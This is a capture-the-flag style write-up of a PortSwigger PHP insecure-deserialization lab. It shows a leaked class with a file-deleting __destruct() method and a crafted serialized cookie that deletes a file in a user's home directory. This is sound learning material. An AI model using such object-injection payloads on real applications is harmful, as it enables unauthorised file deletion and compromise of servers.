# [Arbitrary object injection in PHP] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-16
 
---
 
## Vulnerability / core concept
Insecure Deserialization

---


## Payload / key command
This web application uses PHP deserialization in Cookie header to determine user session. Its decoded form looks like this:
```bash
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"smcch9bii6u89onee5d6x4bd566pu29g";}
```

During inspection, we can see `/libs/CustomTemplate.php` endpoint in source page. After visiting it and appending `~` we can see the source code:
```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }
...

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
As you can see, there is a magic method `__destruct()` that we can use to exploit this lab. In the request, we send the following encoded cookie:
```bash
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
This would access and delete `morale.txt` file from `carlos` home directory and solve the lab.
